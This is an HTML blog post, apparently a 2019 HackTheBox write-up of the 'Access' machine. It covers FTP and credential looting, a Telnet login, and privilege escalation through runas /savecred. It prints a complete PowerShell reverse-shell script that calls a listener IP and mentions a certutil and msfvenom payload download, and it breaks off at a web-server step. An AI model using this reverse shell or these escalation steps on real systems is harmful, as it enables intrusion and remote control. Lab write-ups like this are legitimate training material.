@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.138.0">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="" />
+  <meta property="og:url" content="https://esox1.github.io/post/hackthebox-access-wt/" />
+  <link rel="canonical" href="https://esox1.github.io/post/hackthebox-access-wt/" /><link rel="alternate" type="application/atom+xml" href="https://esox1.github.io/index.xml" title="Hi, folks | Islam">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "https:\/\/esox1.github.io\/"
+      },
+      "articleSection" : "post",
+      "name" : "HTB\/ACCESS",
+      "headline" : "HTB\/ACCESS",
+      "description" : "Reconnaissance Box IP: 10.10.10.98, I started with a network scan. Here\u0026rsquo;s what I found: PORT | STATE | SERVICE | VERSION 21\/tcp | open | ftp | Microsoft ftpd 23\/tcp | open | telnet | 80\/tcp | open | http | Microsoft IIS httpd 7.5 On port 80, there was a picture of a server room, \u0026ldquo;out.jpg\u0026rdquo;, which I saved for later. ",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2019",
+      "datePublished": "2019-02-03 00:00:00 \u002b0000 UTC",
+      "dateModified" : "2019-02-03 00:00:00 \u002b0000 UTC",
+      "url" : "https:\/\/esox1.github.io\/post\/hackthebox-access-wt\/",
+      "keywords" : [ "htb","Windows","mdb","powershell", ]
+  }
+</script>
+<title>HTB/ACCESS</title>
+  <meta property="og:title" content="HTB/ACCESS" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="Reconnaissance Box IP: 10.10.10.98, I started with a network scan. Here&rsquo;s what I found: PORT | STATE | SERVICE | VERSION 21/tcp | open | ftp | Microsoft ftpd 23/tcp | open | telnet | 80/tcp | open | http | Microsoft IIS httpd 7.5 On port 80, there was a picture of a server room, &ldquo;out.jpg&rdquo;, which I saved for later. " />
+  <meta name="description" content="Reconnaissance Box IP: 10.10.10.98, I started with a network scan. Here&rsquo;s what I found: PORT | STATE | SERVICE | VERSION 21/tcp | open | ftp | Microsoft ftpd 23/tcp | open | telnet | 80/tcp | open | http | Microsoft IIS httpd 7.5 On port 80, there was a picture of a server room, &ldquo;out.jpg&rdquo;, which I saved for later. " />
+  <meta property="og:locale" content="en" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:3rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:6px}.post-content .post-gallery{display:flex;flex-wrap:wrap;gap:6px}.post-content .post-gallery img{margin-right:auto;margin-top:auto;width:calc(50% - 3px)}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}.post-content .post-gallery img{width:100%}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Hi, folks | Islam">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxx"></script>
+</head>
+
+
+<body>
+  <article class="post English" id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >Kadc3l</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md header-items">
+  
+  <div class="header-item">
+    <a href="/about/" target="_blank">$whoami</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://www.linkedin.com/in/tohis/" target="_blank">Linkedin</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://github.com/esox1" target="_blank">Github</a>
+  </div>
+  
+</div>
+<div class="row">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">HTB/ACCESS</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2019-02-03 00:00:00 UTC">
+                03 Feb 2019
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="reconnaissance">Reconnaissance</h1>
+<ol>
+<li>Box IP: 10.10.10.98, I started with a network scan. Here&rsquo;s what I found:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    PORT |  STATE | SERVICE | VERSION
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    21/tcp | open | ftp    | Microsoft ftpd
+</span></span><span style="display:flex;"><span>    23/tcp | open | telnet |
+</span></span><span style="display:flex;"><span>    80/tcp | open | http   | Microsoft IIS httpd 7.5
+</span></span></code></pre></div><ol start="2">
+<li>On port 80, there was a picture of a server room, <strong>&ldquo;out.jpg&rdquo;</strong>, which I saved for later.</li>
+</ol>
+<p><img alt="Port 80 Image" src="/images/htb-Access/1.png"></p>
+<ul>
+<li>I examined <strong>out.jpg</strong> in stegsolve, hoping for a hidden flag. Neither strings nor binwalk revealed anything interesting, so I moved on to the FTP service.</li>
+</ul>
+<ol start="3">
+<li>I launched FileZilla to connect to <strong>10.10.10.98</strong> as an anonymous user. The root contained two folders: <strong>Backup</strong> (with an <code>.mbd</code> file) and <strong>Engineers</strong> (with a password-protected zip file).</li>
+</ol>
+<p><img alt="FTP Results" src="/images/htb-Access/ftp-results.png"></p>
+<ol start="4">
+<li>Attempting brute-forcing with fcrackzip was slow, so I accessed the <strong>backup.mdb</strong> file using an <code>.mdb</code> viewer.</li>
+</ol>
+<p><img alt="MDB Table" src="/images/htb-Access/backup-mdb-table.png"></p>
+<ol start="5">
+<li>I found usernames and passwords in the <strong>auth-user record</strong> within <strong>backup.mdb</strong>.</li>
+</ol>
+<ul>
+<li>To export all records from the mdb table:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mdb-tables -d <span style="font-style:italic">&#39;,&#39;</span> backup.mdb | xargs -L1 -d<span style="font-style:italic">&#39;,&#39;</span> -I{} bash -c <span style="font-style:italic">&#39;mdb-export backup.mdb &#34;$1&#34; &gt;&#34;$1&#34;.csv&#39;</span> -- {}
+</span></span></code></pre></div><ul>
+<li>Some records were empty. The interesting one was <strong>auth user record</strong>.</li>
+</ul>
+<p><img alt="alt text" src="/images/htb-Access/backup-mdb-export.png"></p>
+<ol start="6">
+<li>Using one of these credentials, <strong>access4u@security</strong>, I successfully opened the zip file. Attempting the usernames and passwords on FTP for elevated access gave no additional privileges.</li>
+</ol>
+<p><img alt="Zip Extraction" src="/images/htb-Access/engineer-access-control-zip-extracted.png"></p>
+<ol start="7">
+<li>Inside was <strong>Access Control.pst</strong>, a Microsoft Outlook email file which I imported into Evolution to inspect.</li>
+</ol>
+<p><img alt="PST Import" src="/images/htb-Access/access-control-pst-outlook.png"></p>
+<ol start="8">
+<li>The email included plaintext credentials for <strong>security: 4Cc3ssC0ntr0ller</strong>. I tried using them on FTP, but that did not work, then I remembered that port 23(Telnet) was open.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/evolution-access-control-pst.png"></p>
+<h1 id="scanning">Scanning</h1>
+<ul>
+<li>With Telnet access</li>
+</ul>
+<p><img alt="Telnet Login" src="/images/htb-Access/security-telnet-login.png"></p>
+<ol start="9">
+<li>I tried upgrading to a meterpreter shell with <strong><code>session -u (Telnet Shell ID)</code></strong> but it wouldn&rsquo;t work, so I just used the win command shell.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/telnet-meterpreter-shell-session-upgrade-u.png"></p>
+<ol start="10">
+<li>I retrieved <strong>user.txt</strong> from the Desktop. Next stop: root.</li>
+</ol>
+<p><img alt="User Hash" src="/images/htb-Access/security-user-txt.png"></p>
+<ol start="11">
+<li>In the <strong>Public</strong> directory, I found hints on htb forum to use the <strong>runas</strong> command, useful for privilege escalation.</li>
+</ol>
+<p><img alt="Public Directory lnk File" src="/images/htb-Access/enumerating-public-desktop-lnk.png"></p>
+<p><img alt="alt text" src="/images/htb-Access/runas-ZAccess-lnk.png"></p>
+<ul>
+<li>The “runas” command is used to run commands as other users on windows. With this, we can run commands as an administrator aka Window’s Run as an administrator</li>
+</ul>
+<ol start="12">
+<li>I realized I can run powershell and I managed to have a reverse shell using runas. At first, PowerShell reverse shell was failing due to restrictions but eventually succeeded after modifying the <strong>Set-ExecutionPolicy</strong>.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>runas /savecred /user:access<span style="font-weight:bold;font-style:italic">\A</span>dministrator <span style="font-weight:bold;font-style:italic">\
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold;font-style:italic"></span><span style="font-style:italic">&#34;powershell Set-ExecutionPolicy RemoteSigned&#34;</span>
+</span></span></code></pre></div><h1 id="exploit">Exploit</h1>
+<ol start="13">
+<li>I setup a listener on port 413 - 10.10.12.109:413 to run in the background (exploit -j) in metasploit</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/meterpreter-listener-powershell.png"></p>
+<ul>
+<li>
+<p>This is a script for prompting a shell with powershell &ndash;&gt; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></p>
+</li>
+<li>
+<p>There&rsquo;s also a one-liner command that you can type using</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>runas /savedcred /user:access<span style="font-weight:bold;font-style:italic">\a</span>dministrator “powershell oneliner command”
+</span></span></code></pre></div><p>However that method didn&rsquo;t work for me.</p>
+<ul>
+<li>I ended up using this script - change  <strong>$socket</strong> variable with your listening IP. (<a href="https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4">https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4</a>)</li>
+</ul>
+<ol start="14">
+<li>On the target/victim machine, in the telnet session. I used  <strong>copy con r.ps1</strong> to create an PowerShell file named r.ps1, pasted the script inside, then CTRL-z,  then Enter to save it and exit.</li>
+</ol>
+<ul>
+<li>My session was interrupted in this session, so I opened another telnet session and repeated the same steps again.</li>
+</ul>
+<ol start="15">
+<li>To run the script  <strong>powershell -command .\r.ps1</strong>  but, that didn&rsquo;t work. I got an error. Basically, saying Powershell scripts cannot run on the machine.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/cannot-load-exec-powershell-script.png"></p>
+<ol start="16">
+<li>I found a way to disable the error via cmd</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> runas.exe  /savecred  /user:Access<span style="font-weight:bold;font-style:italic">\A</span>dministrator <span style="font-weight:bold;font-style:italic">\
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold;font-style:italic"></span><span style="font-style:italic">&#34;powershell Set-ExecutionPolicy RemoteSigned&#34;</span>
+</span></span></code></pre></div><ol start="17">
+<li>That took care of it, re-running the Powershell command &ldquo;.\r.ps1&rdquo; worked.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/meterpreter-half-establised-powershell.png"></p>
+<ol start="18">
+<li>The powershell script below also works, paste it in a .ps1 file on target.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$client = New-Object System.Net.Sockets.TCPClient(<span style="font-style:italic">&#34;10.10.12.109&#34;</span>,413);$stream = 
+</span></span><span style="display:flex;"><span>$client.GetStream();[byte[]]$bytes = 0..65535|%{0};<span style="font-weight:bold">while</span>(($i = $stream.Read($bytes,
+</span></span><span style="display:flex;"><span>0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).
+</span></span><span style="display:flex;"><span>GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = 
+</span></span><span style="display:flex;"><span>$sendback + <span style="font-style:italic">&#34;PS &#34;</span> + (pwd).Path + <span style="font-style:italic">&#34;&gt; &#34;</span>;$sendbyte = ([text.encoding]::ASCII).GetBytes
+</span></span><span style="display:flex;"><span>($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.
+</span></span><span style="display:flex;"><span>Close()
+</span></span></code></pre></div><ol start="19">
+<li>Unfortunately, I realized that this shell was not a full established shell cause none of the commands like &ldquo;load&rdquo; “shell&quot; or “ls” worked in meterpreter. It was an incomplete connection.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/meterpreter-halfestablished-powershell.png"></p>
+<ol start="20">
+<li>I looked for another way, I found <strong>CertUtil.exe</strong> was not blocked and it can be used to download a payload and get a reverse shell. I downloaded a payload for a reverse shell which allowed full meterpreter access.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/paylaod-msfvenom-create.png"></p>
+<ol start="21">
+<li>I started a temporary webserver with <strong>simpleHTTPserver</strong> on the directory where notepad.exe (payload I created) was.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/simpleHttp-python-command.png"></p>
